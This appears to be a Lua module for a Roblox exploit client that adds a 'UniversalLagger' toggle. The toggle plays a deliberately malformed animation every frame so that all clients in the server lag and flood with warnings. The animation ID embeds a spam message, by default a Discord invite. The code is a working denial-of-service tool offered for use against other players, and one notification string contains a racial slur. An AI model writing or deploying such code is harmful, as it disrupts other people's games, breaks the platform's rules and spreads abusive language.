local UniversalLagger
local Message

local DEFAULT_MESSAGE = 'join https://discord.gg/bMZ4BSUR47 and have fun :v'

UniversalLagger = vape.Categories.World:CreateModule({
	Name = 'UniversalLagger',
	Function = function(callback)
		if callback then
            notif('UniversalLagger', 'yo nigga lets see their reaction !1!1!11!', 5)

			local character = lplr.Character
			local animator = character and character:FindFirstChildWhichIsA('Animator', true) or nil

			if animator then
				local random = Random.new()
				local text = Message.Value or ''
				if text == '' then
					text = DEFAULT_MESSAGE
				end

				-- build ONE broken anim, then spam it instead of making a new one each frame
				local animation = Instance.new('Animation')
				-- yk a broken anim can make roblox fucking warn every clients
				animation.AnimationId = 'http=5077706747\1'..random:NextInteger(1, 1000000)..'\n \n'..text..'\n \n'

				repeat
					local loaded = animator:LoadAnimation(animation)
					loaded:Play(0, 0.0001, 0)
					task.wait()
				until not UniversalLagger.Enabled
			end
		end
	end,
	Tooltip = 'lags ur server, thx v3rm'
})
Message = UniversalLagger:CreateTextBox({
	Name = 'Message',
	Placeholder = 'Message',
	Tooltip = 'leave it blank to use preset',
	Function = function()
        UniversalLagger:Toggle()
		UniversalLagger:Toggle()
    end,
})